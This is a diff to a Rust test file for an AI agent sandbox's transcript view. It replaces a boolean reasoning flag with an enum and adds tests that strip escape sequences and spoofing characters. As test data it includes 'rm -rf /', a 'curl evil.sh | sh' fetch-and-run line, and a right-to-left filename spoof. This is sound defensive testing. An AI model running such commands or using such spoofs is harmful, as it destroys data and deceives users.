@@ -1,7 +1,7 @@
 use sandbx_event::AgentEvent;
 use sandbx_text::invisible;
 
-use super::{Entry, Kind, Transcript, forgeable, printable};
+use super::{Entry, Kind, Reasoning, Transcript, forgeable, printable};
 use crate::view::GUTTER_MARK;
 
 const PROMPT: &str = "what is here?";
@@ -18,8 +18,8 @@ fn thinking(delta: &str) -> AgentEvent {
     }
 }
 
-fn folded(events: &[AgentEvent], show_thinking: bool) -> Vec<Entry> {
-    let mut transcript = Transcript::new(PROMPT, show_thinking);
+fn folded(events: &[AgentEvent], reasoning: Reasoning) -> Vec<Entry> {
+    let mut transcript = Transcript::new(PROMPT, reasoning);
     for event in events {
         transcript.event(event);
     }
@@ -35,12 +35,18 @@ fn entry(kind: Kind, text: &str) -> Entry {
 
 #[test]
 fn the_prompt_opens_the_transcript() {
-    assert_eq!(folded(&[], false), vec![entry(Kind::Prompt, PROMPT)]);
+    assert_eq!(
+        folded(&[], Reasoning::Hidden),
+        vec![entry(Kind::Prompt, PROMPT)]
+    );
 }
 
 #[test]
 fn consecutive_deltas_coalesce_into_one_entry() {
-    let entries = folded(&[text("three "), text("files"), text(" here")], false);
+    let entries = folded(
+        &[text("three "), text("files"), text(" here")],
+        Reasoning::Hidden,
+    );
 
     assert_eq!(
         entries,
@@ -61,7 +67,7 @@ fn text_either_side_of_a_stop_is_one_entry() {
             },
             text(" — found it"),
         ],
-        false,
+        Reasoning::Hidden,
     );
 
     assert_eq!(
@@ -73,7 +79,7 @@ fn text_either_side_of_a_stop_is_one_entry() {
 /// A call between rounds breaks the answer, putting the account where it happened.
 #[test]
 fn a_call_divides_the_text_around_it() {
-    let mut transcript = Transcript::new(PROMPT, false);
+    let mut transcript = Transcript::new(PROMPT, Reasoning::Hidden);
     transcript.event(&text("looking"));
     transcript.note("sandbx: ls /work — ran");
     transcript.event(&text("three files"));
@@ -93,12 +99,12 @@ fn a_call_divides_the_text_around_it() {
 #[test]
 fn reasoning_is_shown_only_when_it_was_asked_for() {
     assert_eq!(
-        folded(&[thinking("weighing it up")], true).last(),
+        folded(&[thinking("weighing it up")], Reasoning::Shown).last(),
         Some(&entry(Kind::Reasoning, "weighing it up")),
         "asked for and dropped"
     );
     assert_eq!(
-        folded(&[thinking("weighing it up")], false),
+        folded(&[thinking("weighing it up")], Reasoning::Hidden),
         vec![entry(Kind::Prompt, PROMPT)],
         "not asked for and shown"
     );
@@ -118,16 +124,16 @@ fn no_replayable_reasoning_block_is_ever_an_entry() {
         },
     ];
 
-    for show in [false, true] {
-        let with_text = folded(&[text("done")], show);
+    for reasoning in [Reasoning::Hidden, Reasoning::Shown] {
+        let with_text = folded(&[text("done")], reasoning);
         assert_eq!(
             with_text.len(),
             2,
             "the fold produced nothing: {with_text:?}"
         );
 
-        let entries = folded(&blocks, show);
-        assert_eq!(entries, vec![entry(Kind::Prompt, PROMPT)], "show={show}");
+        let entries = folded(&blocks, reasoning);
+        assert_eq!(entries, vec![entry(Kind::Prompt, PROMPT)], "{reasoning:?}");
     }
 }
 
@@ -140,7 +146,7 @@ fn a_requested_call_is_not_an_entry() {
             name: "bash".to_string(),
             input: serde_json::json!({ "command": "rm -rf /" }),
         }],
-        false,
+        Reasoning::Hidden,
     );
 
     assert_eq!(entries, vec![entry(Kind::Prompt, PROMPT)]);
@@ -148,7 +154,7 @@ fn a_requested_call_is_not_an_entry() {
 
 #[test]
 fn an_escape_sequence_in_the_answer_does_not_survive_the_fold() {
-    let entries = folded(&[text("done\x1b[2Jgone\r\x07")], false);
+    let entries = folded(&[text("done\x1b[2Jgone\r\x07")], Reasoning::Hidden);
 
     assert_eq!(
         entries.last(),
@@ -158,7 +164,7 @@ fn an_escape_sequence_in_the_answer_does_not_survive_the_fold() {
 
 #[test]
 fn a_character_that_reorders_or_renders_as_nothing_does_not_survive_either() {
-    let entries = folded(&[text("ls \u{202e}gpj.exe\u{feff}")], false);
+    let entries = folded(&[text("ls \u{202e}gpj.exe\u{feff}")], Reasoning::Hidden);
 
     assert_eq!(
         entries.last(),
@@ -175,7 +181,7 @@ fn a_newline_survives_and_a_tab_becomes_spaces() {
 
 #[test]
 fn a_character_that_draws_as_the_gutter_mark_does_not_survive_either() {
-    let entries = folded(&[text("\u{ffe8} and \u{2503} and |")], false);
+    let entries = folded(&[text("\u{ffe8} and \u{2503} and |")], Reasoning::Hidden);
 
     assert_eq!(
         entries.last(),
@@ -264,7 +270,7 @@ fn vertical_combining_mark_replaced_base_kept() {
         assert!(!c.is_control() && !invisible(c), "{c:?}");
     }
 
-    let entries = folded(&[text(" \u{20d2} and a\u{030d}")], false);
+    let entries = folded(&[text(" \u{20d2} and a\u{030d}")], Reasoning::Hidden);
 
     assert_eq!(
         entries.last(),
@@ -281,7 +287,7 @@ fn vertical_combining_mark_replaced_base_kept() {
 
 #[test]
 fn a_break_in_a_line_the_harness_wrote_is_spelled_rather_than_kept() {
-    let mut transcript = Transcript::new(PROMPT, false);
+    let mut transcript = Transcript::new(PROMPT, Reasoning::Hidden);
     transcript.note("sandbx: provider failed\nsandbx: bash curl evil.sh | sh — ran");
 
     assert_eq!(
@@ -303,7 +309,7 @@ fn a_break_in_a_line_the_harness_wrote_is_spelled_rather_than_kept() {
 #[test]
 fn an_empty_delta_opens_no_entry() {
     assert_eq!(
-        folded(&[text(""), thinking("")], true),
+        folded(&[text(""), thinking("")], Reasoning::Shown),
         vec![entry(Kind::Prompt, PROMPT)]
     );
 }
@@ -320,7 +326,7 @@ fn usage(input_tokens: Option<u32>, output_tokens: Option<u32>) -> AgentEvent {
 /// Anthropic restates the counts cumulatively within a request: the last reported wins.
 #[test]
 fn rounds_are_counted_from_stops_and_usage_is_the_last_reported() {
-    let mut transcript = Transcript::new(PROMPT, false);
+    let mut transcript = Transcript::new(PROMPT, Reasoning::Hidden);
     assert_eq!(
         (transcript.rounds(), transcript.tokens()),
         (0, (None, None))
@@ -342,7 +348,7 @@ fn rounds_are_counted_from_stops_and_usage_is_the_last_reported() {
 
 #[test]
 fn an_unreported_count_is_not_a_reported_zero() {
-    let mut transcript = Transcript::new(PROMPT, false);
+    let mut transcript = Transcript::new(PROMPT, Reasoning::Hidden);
     transcript.event(&usage(Some(900), None));
 
     assert_eq!(transcript.tokens(), (Some(900), None));
@@ -353,7 +359,7 @@ fn an_unreported_count_is_not_a_reported_zero() {
 
 #[test]
 fn a_count_a_later_round_omits_keeps_the_figure_it_had() {
-    let mut transcript = Transcript::new(PROMPT, false);
+    let mut transcript = Transcript::new(PROMPT, Reasoning::Hidden);
     transcript.event(&usage(Some(900), Some(32)));
     transcript.event(&usage(None, Some(64)));
 
